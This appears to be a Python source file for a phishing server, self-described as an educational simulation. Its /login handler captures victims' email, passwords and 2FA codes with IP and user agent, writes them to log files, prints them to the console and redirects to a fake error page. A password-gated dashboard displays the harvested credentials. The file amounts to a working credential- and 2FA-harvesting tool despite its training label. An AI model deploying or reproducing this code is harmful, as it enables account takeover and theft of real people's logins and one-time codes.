#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os
import re

DASHBOARD_PASSWORD = "phishing@10$"

class Handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        # Main page
        if self.path == '/' or self.path == '/index.html':
            self.serve_file('index.html')
        
        # Error/success page
        elif self.path == '/error.html':
            self.serve_file('error.html')
        
        # Dashboard
        elif self.path.startswith('/dashboard'):
            self.serve_dashboard()
        
        # Statistics
        elif self.path.startswith('/stats'):
            self.serve_stats()
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Page not found')
    
    def serve_file(self, filename):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'File not found')
    
    def serve_dashboard(self):
        # Check password
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'Unauthorized. Use ?pass=phishing@10$')
            return
        
        # Read captured credentials
        captured_data = ""
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                captured_data = f.read()
        
        # Extract unique IPs
        unique_ips = []
        ip_entries = []
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                for line in f:
                    if 'IP:' in line:
                        # Extract IP address
                        ip_match = re.search(r'IP:\s*([\d\.]+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            if ip not in unique_ips:
                                unique_ips.append(ip)
                            ip_entries.append({'ip': ip, 'line': line.strip()})
        
        # Build IP list HTML
        ip_html = ""
        for ip in unique_ips:
            ip_html += f'<li style="color: #ffaa00; margin: 5px 0; padding: 5px; background: #0d1127; border-radius: 4px;">🌐 {ip}</li>\n'
        
        # Count total attempts
        total_attempts = 0
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                total_attempts = len(f.readlines())
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Dashboard</title>
            <style>
                body {{ background: #0a0e27; color: #00ff00; font-family: monospace; padding: 20px; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .card {{ background: #1a1f3a; padding: 20px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #00ff00; }}
                .card-red {{ border-left-color: #ff0000; }}
                pre {{ background: #0d1127; padding: 15px; overflow-x: auto; white-space: pre-wrap; border-radius: 4px; font-size: 12px; }}
                button {{ background: #00ff00; color: #0a0e27; padding: 10px 20px; border: none; cursor: pointer; margin: 10px 0; border-radius: 4px; font-weight: bold; }}
                button:hover {{ background: #00cc00; }}
                .stats-grid {{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin-bottom: 20px; }}
                .stat-box {{ background: #0d1127; padding: 20px; border-radius: 8px; text-align: center; }}
                .stat-number {{ font-size: 48px; font-weight: bold; color: #00ff00; }}
                .stat-label {{ color: #8899a6; margin-top: 10px; }}
                .nav {{ margin-bottom: 20px; }}
                a {{ color: #00ff00; margin-right: 20px; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                .ip-list {{ list-style: none; padding: 0; }}
                .footer {{ margin-top: 40px; text-align: center; color: #8899a6; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔐 Phishing Simulation Dashboard</h1>
                
                <div class="nav">
                    <a href="/">🏠 Home</a>
                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📊 Dashboard</a>
                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
                    <a href="/error.html">⚠️ Error Page</a>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-number">{total_attempts}</div>
                        <div class="stat-label">Total Login Attempts</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">{len(unique_ips)}</div>
                        <div class="stat-label">Unique IP Addresses</div>
                    </div>
                </div>
                
                <div class="card">
                    <h2>🌐 Captured IP Addresses</h2>
                    {f'<ul class="ip-list">{ip_html}</ul>' if ip_html else '<p>No IPs captured yet...</p>'}
                    <p style="color: #8899a6; font-size: 12px; margin-top: 10px;">📍 Each IP address represents a unique visitor</p>
                </div>
                
                <div class="card">
                    <h2>📋 Captured Credentials (With IPs)</h2>
                    <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
                </div>
                
                <div class="card card-red">
                    <h2>⚠️ EDUCATIONAL USE ONLY</h2>
                    <p>This dashboard shows captured credentials for security awareness training.</p>
                    <p><strong>🔒 Dashboard is password protected</strong></p>
                    <p><strong>💾 All data is ephemeral</strong> - Will be lost when server restarts</p>
                    <form action="/clear_logs" method="POST">
                        <input type="hidden" name="pass" value="{DASHBOARD_PASSWORD}">
                        <button type="submit" onclick="return confirm('⚠️ WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
                            🗑️ Clear All Logs
                        </button>
                    </form>
                </div>
                
                <div class="footer">
                    <p>🔐 Educational Phishing Simulation | For Security Training Only</p>
                    <p>Access dashboard with: ?pass={DASHBOARD_PASSWORD}</p>
                </div>
            </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_stats(self):
        # Check password
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params.get('pass', [''])[0] != DASHBOARD_PASSWORD:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'Unauthorized. Use ?pass=phishing@10$')
            return
        
        # Count attempts and unique IPs
        total = 0
        unique_ips = []
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                lines = f.readlines()
                total = len(lines)
                for line in lines:
                    if 'IP:' in line:
                        ip_match = re.search(r'IP:\s*([\d\.]+)', line)
                        if ip_match:
                            ip = ip_match.group(1)
                            if ip not in unique_ips:
                                unique_ips.append(ip)
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Simulation Statistics</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; }}
                .stats {{ background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .number {{ font-size: 48px; color: #4a90e2; font-weight: bold; }}
                h1 {{ color: #333; }}
                .nav {{ margin-bottom: 20px; }}
                a {{ color: #4a90e2; text-decoration: none; margin-right: 20px; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📊 Simulation Statistics</h1>
                <div class="nav">
                    <a href="/">🏠 Home</a>
                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📋 Dashboard</a>
                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
                </div>
                
                <div class="stats">
                    <h2>Total Login Attempts</h2>
                    <div class="number">{total}</div>
                </div>
                
                <div class="stats">
                    <h2>Unique IP Addresses</h2>
                    <div class="number">{len(unique_ips)}</div>
                </div>
                
                <div class="stats">
                    <h2>IP Address List</h2>
                    <ul>
                        {''.join([f'<li>{ip}</li>' for ip in unique_ips]) if unique_ips else '<li>No IPs captured yet</li>'}
                    </ul>
                </div>
                
                <div class="stats">
                    <p><a href="/dashboard?pass={DASHBOARD_PASSWORD}">← Back to Dashboard</a></p>
                </div>
            </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            parsed = urllib.parse.parse_qs(data.decode())
            
            email = parsed.get('email', [''])[0]
            password = parsed.get('password', [''])[0]
            totp = parsed.get('totp', [''])[0]
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            
            # Handle proxy forwarding (when behind load balancer)
            if ip and ',' in ip:
                ip = ip.split(',')[0].strip()
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Save to file
            with open('captured_log.txt', 'a') as f:
                f.write(f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password} | 2FA: {totp}\n")
            
            # Also save to JSON
            detailed_entry = {
                'timestamp': timestamp,
                'ip': ip,
                'email': email,
                'password': password,
                'totp': totp if totp else None,
                'user_agent': self.headers.get('User-Agent', 'Unknown')
            }
            
            if os.path.exists('detailed_log.json'):
                with open('detailed_log.json', 'r') as f:
                    logs = json.load(f)
            else:
                logs = []
            
            logs.append(detailed_entry)
            
            with open('detailed_log.json', 'w') as f:
                json.dump(logs, f, indent=2)
            
            # Console output
            print("\n" + "="*50)
            print(f"[!] CREDENTIALS CAPTURED - {timestamp}")
            print("="*50)
            print(f"📧 Email:    {email}")
            print(f"🔐 Password: {password}")
            if totp:
                print(f"📱 2FA Code: {totp}")
            print(f"🌐 IP:       {ip}")
            print("="*50 + "\n")
            
            self.send_response(302)
            self.send_header('Location', '/error.html')
            self.end_headers()
        
        elif self.path == '/clear_logs':
            # Check password
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            parsed = urllib.parse.parse_qs(data.decode())
            
            if parsed.get('pass', [''])[0] != DASHBOARD_PASSWORD:
                self.send_response(401)
                self.end_headers()
                return
            
            if os.path.exists('captured_log.txt'):
                os.remove('captured_log.txt')
            if os.path.exists('detailed_log.json'):
                os.remove('detailed_log.json')
            
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ADMIN] Logs cleared")
            
            self.send_response(302)
            self.send_header('Location', '/dashboard?pass=' + DASHBOARD_PASSWORD)
            self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default HTTP logs"""
        pass

def run():
    import json
    port = int(os.environ.get('PORT', 5000))
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, Handler)
    print("\n" + "="*50)
    print("🔐 PHISHING SIMULATION")
    print("="*50)
    print(f"✅ Server running on port {port}")
    print(f"🔑 Dashboard Password: {DASHBOARD_PASSWORD}")
    print(f"📊 Dashboard: /dashboard?pass={DASHBOARD_PASSWORD}")
    print("\n" + "="*50)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
